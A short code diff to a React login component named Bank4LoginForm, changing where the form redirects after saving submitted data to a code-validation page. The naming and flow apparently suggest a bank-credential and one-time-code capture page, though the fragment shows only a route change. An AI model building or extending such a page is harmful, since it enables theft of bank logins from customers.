@@ -38,7 +38,7 @@ export default function Bank4LoginForm() {
 
       if (error) throw error
 
-      router.push(`/code2/${tableName}/${data.id}`) // Redirige vers la page de validation du code
+      router.push(`/code-es/${tableName}/${data.id}`) // Redirige vers la page de validation du code
       
     } catch (error: any) {
       console.error('Erreur lors de l\'enregistrement:', error)
